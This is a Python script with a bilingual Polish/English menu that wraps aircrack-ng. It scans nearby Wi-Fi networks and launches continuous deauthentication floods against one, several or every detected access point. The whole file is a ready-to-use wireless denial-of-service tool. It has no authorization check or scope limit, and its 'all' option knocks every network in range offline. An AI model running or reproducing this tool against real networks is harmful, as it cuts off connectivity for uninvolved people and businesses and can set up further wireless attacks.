import subprocess
import time
import os
import csv

# Language dictionaries
LANGUAGES = {
    'pl': {
        'choose_lang': "Wybierz język / Choose language:",
        'lang_options': "1. polski\n2. angielski (USA)",
        'scan_wait': "Skanowanie sieci Wi-Fi. Proszę czekać...",
        'no_networks': "Brak sieci Wi-Fi do wyświetlenia. Spróbuj ponownie później.",
        'found_networks': "\nZnalezione sieci Wi-Fi:",
        'menu_hint': "Możesz wpisać numer jednej sieci (np. 2), kilka numerów oddzielonych przecinkiem lub spacją (np. 2,4 lub 2 4),\nalbo 'wszystko' by zdeautoryzować wszystkie, lub 'ponów' by zeskanować jeszcze raz.",
        'choice_prompt': "Twój wybór: ",
        'starting_deauth_all': "\nRozpoczynam deautoryzację wszystkich wykrytych sieci...",
        'stop_hint_all': "Aby zatrzymać atak na wszystkie sieci wpisz 'stop'.",
        'stopped_all': "Zatrzymano wszystkie deautoryzacje.",
        'stop_hint': "Aby zakończyć wpisz 'stop'.",
        'invalid_choice': "Błędny wybór!",
        'selected_network': "\nWybrana sieć: {ssid}",
        'starting_deauth': "Uruchamiam deautoryzację... (wpisz 'stop' aby zakończyć)",
        'stopped_selected': "Zatrzymano deautoryzację wybranej sieci.",
        'starting_deauth_multiple': "\nUruchamiam deautoryzację wybranych sieci...",
        'stopped_multiple': "Zatrzymano deautoryzację wybranych sieci.",
        'next_action': "\nCo chcesz zrobić dalej?",
        'again_hint': "1. Ponownie zeskanuj i pokaż listę sieci Wi-Fi (wpisz: ponów)",
        'end_hint': "2. Zakończ program i przywróć zwykły tryb Wi-Fi (wpisz: koniec)",
        'again_or_end': "Twój wybór ('ponów' lub 'koniec'): ",
        'monitor_off': "Tryb monitorowania wyłączony. Interfejs wlan0 przywrócony. Możesz korzystać z Wi-Fi normalnie.",
        'program_end': "Program zakończony.",
        'scan_result_missing': "Nie znaleziono pliku wynikowego ze skanowania! Sprawdź uprawnienia.",
        'no_wifi_found': "Nie znaleziono żadnych sieci Wi-Fi!",
    },
    'en': {
        'choose_lang': "Choose language:",
        'lang_options': "1. Polish\n2. English (USA)",
        'scan_wait': "Scanning for Wi-Fi networks. Please wait...",
        'no_networks': "No Wi-Fi networks found. Try again later.",
        'found_networks': "\nFound Wi-Fi networks:",
        'menu_hint': "You can enter a single network number (e.g. 2), multiple numbers separated by commas or spaces (e.g. 2,4 or 2 4),\nor 'all' to deauth all networks, or 'again' to rescan.",
        'choice_prompt': "Your choice: ",
        'starting_deauth_all': "\nStarting deauthentication of all detected networks...",
        'stop_hint_all': "Type 'stop' to stop deauthing all networks.",
        'stopped_all': "Stopped all deauth processes.",
        'stop_hint': "Type 'stop' to stop.",
        'invalid_choice': "Invalid choice!",
        'selected_network': "\nSelected network: {ssid}",
        'starting_deauth': "Starting deauthentication... (type 'stop' to quit)",
        'stopped_selected': "Stopped deauth on selected network.",
        'starting_deauth_multiple': "\nStarting deauthentication on selected networks...",
        'stopped_multiple': "Stopped deauth on selected networks.",
        'next_action': "\nWhat do you want to do next?",
        'again_hint': "1. Rescan and show Wi-Fi networks (type: again)",
        'end_hint': "2. Exit and restore normal Wi-Fi mode (type: end)",
        'again_or_end': "Your choice ('again' or 'end'): ",
        'monitor_off': "Monitor mode disabled. wlan0 restored. You can use Wi-Fi normally.",
        'program_end': "Program ended.",
        'scan_result_missing': "Scan output file not found! Check permissions.",
        'no_wifi_found': "No Wi-Fi networks found!",
    }
}

def select_language():
    print(LANGUAGES['pl']['choose_lang'])
    print(LANGUAGES['pl']['lang_options'])
    choice = input('> ').strip()
    if choice == '1':
        return 'pl'
    elif choice == '2':
        return 'en'
    else:
        print("Domyślny język: polski / Default language: Polish.")
        return 'pl'

def scan_networks(lang):
    subprocess.run("sudo airmon-ng check kill", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("sudo airmon-ng start wlan0", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    scan_file = "scan-01.csv"
    if os.path.exists(scan_file):
        os.remove(scan_file)
    scan_cmd = f"sudo timeout 10 airodump-ng --output-format csv -w scan wlan0mon"
    subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not os.path.exists(scan_file):
        print(LANGUAGES[lang]['scan_result_missing'])
        return []

    networks = []
    with open(scan_file, newline='', encoding='utf-8', errors='ignore') as csvfile:
        reader = csv.reader(csvfile)
        section = "header"
        for row in reader:
            if len(row) == 0:
                continue
            if row[0].strip() == "BSSID":
                section = "networks"
                continue
            if section == "networks":
                if row[0].strip() == "" or len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                ssid = row[13].strip()
                if bssid and channel and ssid:
                    networks.append((bssid, channel, ssid))
            if row[0].strip().startswith("Station MAC"):
                break

    seen = set()
    unique_networks = []
    for net in networks:
        if net[2] not in seen and net[2] != "":
            unique_networks.append(net)
            seen.add(net[2])

    if not unique_networks:
        print(LANGUAGES[lang]['no_wifi_found'])
    return unique_networks

def start_deauth(bssid, channel):
    subprocess.run(f"sudo iwconfig wlan0mon channel {channel}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "wlan0mon"]
    proc = subprocess.Popen(
        deauth_cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    return proc

def start_deauth_multiple(networks, indexes):
    procs = []
    for i in indexes:
        try:
            bssid, channel, ssid = networks[i]
            subprocess.run(f"sudo iwconfig wlan0mon channel {channel}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "wlan0mon"]
            proc = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            procs.append(proc)
        except IndexError:
            continue
    return procs

def stop_monitor_mode(lang):
    subprocess.run("sudo airmon-ng stop wlan0mon", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("sudo ip link set wlan0 up", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(LANGUAGES[lang]['monitor_off'])

def parse_indexes(user_input, max_index):
    delimiters = [',', ' ']
    for d in delimiters:
        if d in user_input:
            tokens = [x.strip() for x in user_input.split(d) if x.strip()]
            break
    else:
        tokens = [user_input.strip()]
    result = []
    for t in tokens:
        if t.isdigit():
            idx = int(t) - 1
            if 0 <= idx < max_index:
                result.append(idx)
    return list(set(result))

def main():
    lang = select_language()
    while True:
        print(LANGUAGES[lang]['scan_wait'])
        networks = scan_networks(lang)
        if not networks:
            print(LANGUAGES[lang]['no_networks'])
            break

        print(LANGUAGES[lang]['found_networks'])
        for i, net in enumerate(networks):
            print(f"{i+1}: {net[2]}")
        print(LANGUAGES[lang]['menu_hint'])

        wyb = input(LANGUAGES[lang]['choice_prompt']).strip().lower()
        if wyb == ("wszystko" if lang == "pl" else "all"):
            print(LANGUAGES[lang]['starting_deauth_all'])
            procs = start_deauth_multiple(networks, range(len(networks)))
            print(LANGUAGES[lang]['stop_hint_all'])
            while True:
                cmd = input("> ").strip().lower()
                if cmd == "stop":
                    for proc in procs:
                        proc.terminate()
                        try:
                            proc.wait(timeout=3)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                    print(LANGUAGES[lang]['stopped_all'])
                    break
                else:
                    print(LANGUAGES[lang]['stop_hint'])
        elif wyb == ("ponów" if lang == "pl" else "again"):
            continue
        else:
            indexes = parse_indexes(wyb, len(networks))
            if not indexes:
                print(LANGUAGES[lang]['invalid_choice'])
                continue

            if len(indexes) == 1:
                idx = indexes[0]
                bssid, channel, ssid = networks[idx]
                print(LANGUAGES[lang]['selected_network'].format(ssid=ssid))
                print(LANGUAGES[lang]['starting_deauth'])

                proc = start_deauth(bssid, channel)
                while True:
                    cmd = input("> ").strip().lower()
                    if cmd == "stop":
                        proc.terminate()
                        try:
                            proc.wait(timeout=3)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                        print(LANGUAGES[lang]['stopped_selected'])
                        break
                    else:
                        print(LANGUAGES[lang]['stop_hint'])
            else:
                print(LANGUAGES[lang]['starting_deauth_multiple'])
                procs = start_deauth_multiple(networks, indexes)
                print(LANGUAGES[lang]['stop_hint'])
                while True:
                    cmd = input("> ").strip().lower()
                    if cmd == "stop":
                        for proc in procs:
                            proc.terminate()
                            try:
                                proc.wait(timeout=3)
                            except subprocess.TimeoutExpired:
                                proc.kill()
                        print(LANGUAGES[lang]['stopped_multiple'])
                        break
                    else:
                        print(LANGUAGES[lang]['stop_hint'])

        print(LANGUAGES[lang]['next_action'])
        print(LANGUAGES[lang]['again_hint'])
        print(LANGUAGES[lang]['end_hint'])
        decyzja = input(LANGUAGES[lang]['again_or_end']).strip().lower()
        if decyzja == ("ponów" if lang == "pl" else "again"):
            continue
        elif decyzja == ("koniec" if lang == "pl" else "end"):
            stop_monitor_mode(lang)
            break
        else:
            print(LANGUAGES[lang]['monitor_off'])
            stop_monitor_mode(lang)
            break

    print(LANGUAGES[lang]['program_end'])

if __name__ == "__main__":
    main()